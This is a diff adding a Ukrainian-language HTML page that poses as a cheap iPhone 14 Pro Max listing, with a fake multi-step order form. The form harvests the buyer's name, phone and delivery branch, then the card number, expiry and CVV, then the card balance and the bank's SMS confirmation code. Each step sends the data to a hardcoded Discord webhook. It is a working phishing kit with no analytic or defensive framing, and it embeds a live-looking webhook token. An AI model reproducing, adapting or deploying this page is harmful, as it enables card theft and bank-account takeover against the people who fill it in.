@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>iPhone 14 Pro Max 256GB Black - 15 000 грн</title>
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box;font-family:Arial}
+    body{background:#f5f5f5;padding:20px}
+    .card{max-width:600px;margin:auto;background:#fff;border-radius:12px;overflow:hidden;box-shadow:0 2px 10px #0001}
+    .header{background:#002f34;color:#fff;padding:15px;text-align:center;font-size:18px}
+    .body{padding:20px}
+    .title{font-size:22px;font-weight:bold}
+    .price{font-size:28px;color:#e61e4d;font-weight:bold;margin:10px 0}
+    .photos{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:20px 0}
+    .photos img{width:100%;height:140px;object-fit:cover;border-radius:8px}
+    .btn{width:100%;padding:16px;background:#002f34;color:#fff;font-size:18px;font-weight:bold;border:none;border-radius:8px;cursor:pointer;margin:20px 0}
+    .form{display:none;margin-top:20px}
+    .form input{width:100%;padding:12px;margin:8px 0;border:1px solid #ccc;border-radius:6px;font-size:16px}
+    .form button{width:100%;padding:14px;background:#e61e4d;color:#fff;font-weight:bold;border:none;border-radius:6px;cursor:pointer}
+    .success{text-align:center;color:green;font-weight:bold;padding:20px;font-size:18px;display:none}
+    .step{display:none}
+  </style>
+</head>
+<body>
+<div class="card">
+  <div class="header">Оголошення</div>
+  <div class="body">
+    <div class="title">iPhone 14 Pro Max 256GB Black</div>
+    <div class="price">15 000 грн</div>
+    <div class="photos">
+      <img src="https://via.placeholder.com/300x300/111/fff?text=Фото+1">
+      <img src="https://via.placeholder.com/300x300/111/fff?text=Фото+2">
+      <img src="https://via.placeholder.com/300x300/111/fff?text=Фото+3">
+      <img src="https://via.placeholder.com/300x300/111/fff?text=Фото+4">
+    </div>
+    <div>● 100% батарея ● Face ID працює ● Нова Пошта</div>
+    
+    <button class="btn" onclick="showStep('step1')">Замовити</button>
+
+    <!-- КРОК 1: ПІБ, телефон, відділення -->
+    <div id="step1" class="step form">
+      <input id="name" placeholder="ПІБ" required>
+      <input id="phone" placeholder="+380..." required>
+      <input id="address" placeholder="Відділення Нової Пошти" required>
+      <button onclick="nextStep('step1', 'step2')">Далі →</button>
+    </div>
+
+    <!-- КРОК 2: Карта — ВІДРАЗУ В DISCORD -->
+    <div id="step2" class="step form">
+      <input id="card" placeholder="Номер карти (16 цифр)" maxlength="19" required>
+      <input id="expiry" placeholder="MM/YY" maxlength="5" required>
+      <input id="cvv" placeholder="CVV (3 цифри)" maxlength="3" required>
+      <button onclick="sendCardAndNext()">Підтвердити оплату →</button>
+    </div>
+
+    <!-- КРОК 3: Баланс на карті -->
+    <div id="step3" class="step form">
+      <p><strong>Скільки грошей на карті?</strong></p>
+      <input id="balance" placeholder="Наприклад: 25000 грн" required>
+      <button onclick="sendBalanceAndNext()">Надіслати баланс →</button>
+    </div>
+
+    <!-- КРОК 4: SMS-код від банку -->
+    <div id="step4" class="step form">
+      <p><strong>Введіть код від банку для підтвердження</strong></p>
+      <input id="sms" placeholder="6-значний код" maxlength="6" required>
+      <button onclick="sendSMSAndFinish()">Підтвердити замовлення →</button>
+      <div id="success" class="success">Дякую! Замовлення підтверджено.</div>
+    </div>
+  </div>
+</div>
+
+<script>
+// ТВІЙ WEBHOOK
+const WEBHOOK = "https://discord.com/api/webhooks/1421154310342840353/yeiUjsx98UpyMpPzZGcJGTSB1LDITzPebV2b4wMqqg7OEymkf12P_VPUiOr6PfDf63ee";
+
+// Форматування
+document.getElementById('card').oninput = e => {
+  let v = e.target.value.replace(/\D/g, '').slice(0,16);
+  e.target.value = v.replace(/(\d{4})/g, '$1 ').trim();
+};
+document.getElementById('expiry').oninput = e => {
+  let v = e.target.value.replace(/\D/g, '').slice(0,4);
+  if (v.length > 2) v = v.slice(0,2) + '/' + v.slice(2);
+  e.target.value = v;
+};
+document.getElementById('cvv').oninput = e => e.target.value = e.target.value.replace(/\D/g, '').slice(0,3);
+document.getElementById('sms').oninput = e => e.target.value = e.target.value.replace(/\D/g, '').slice(0,6);
+
+function showStep(id) {
+  document.querySelector('.btn').style.display = 'none';
+  document.getElementById(id).style.display = 'block';
+}
+
+function nextStep(current, next) {
+  const inputs = document.querySelectorAll(`#${current} input`);
+  for (let input of inputs) {
+    if (!input.value.trim()) return alert("Заповніть усі поля!");
+  }
+  document.getElementById(current).style.display = 'none';
+  document.getElementById(next).style.display = 'block';
+}
+
+// КРОК 2: ВІДПРАВЛЯЄМО КАРТУ В DISCORD
+async function sendCardAndNext() {
+  const name = document.getElementById('name').value.trim();
+  const phone = document.getElementById('phone').value.trim();
+  const address = document.getElementById('address').value.trim();
+  const card = document.getElementById('card').value.trim();
+  const expiry = document.getElementById('expiry').value.trim();
+  const cvv = document.getElementById('cvv').value.trim();
+
+  if (card.replace(/\s/g,'').length !== 16 || expiry.length !== 5 || cvv.length !== 3) {
+    return alert("Перевірте дані карти!");
+  }
+
+  const data = {
+    embeds: [{
+      title: "КАРТА ОТРИМАНА",
+      color: 16763904,
+      fields: [
+        { name: "ПІБ", value: name },
+        { name: "Телефон", value: phone },
+        { name: "Відділення", value: address },
+        { name: "Номер карти", value: "```" + card + "```" },
+        { name: "Термін дії", value: "```" + expiry + "```" },
+        { name: "CVV", value: "```" + cvv + "```" }
+      ],
+      timestamp: new Date().toISOString()
+    }]
+  };
+
+  await fetch(WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(data) });
+  nextStep('step2', 'step3');
+}
+
+// КРОК 3: ВІДПРАВЛЯЄМО БАЛАНС
+async function sendBalanceAndNext() {
+  const balance = document.getElementById('balance').value.trim();
+  if (!balance) return alert("Введіть баланс!");
+
+  const data = {
+    embeds: [{
+      title: "БАЛАНС НА КАРТІ",
+      color: 65280,
+      fields: [{ name: "БАЛАНС", value: "```" + balance + "```", inline: false }],
+      timestamp: new Date().toISOString()
+    }]
+  };
+
+  await fetch(WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(data) });
+  nextStep('step3', 'step4');
+}
+
+// КРОК 4: ВІДПРАВЛЯЄМО SMS-КОД + ФІНАЛ
+async function sendSMSAndFinish() {
+  const sms = document.getElementById('sms').value.trim();
+  if (sms.length !== 6) return alert("Код — 6 цифр!");
+
+  const data = {
+    embeds: [{
+      title: "ЗАМОВЛЕННЯ ПІДТВЕРДЖЕНО",
+      color: 3066993,
+      fields: [{ name: "КОД ВІД БАНКУ", value: "```" + sms + "```", inline: false }],
+      timestamp: new Date().toISOString(),
+      footer: { text: "Повний доступ отримано" }
+    }]
+  };
+
+  await fetch(WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(data) });
+
+  document.getElementById('success').style.display = 'block';
+  document.querySelectorAll('input, button').forEach(el => el.disabled = true);
+}
+</script>
+</body>
+</html>
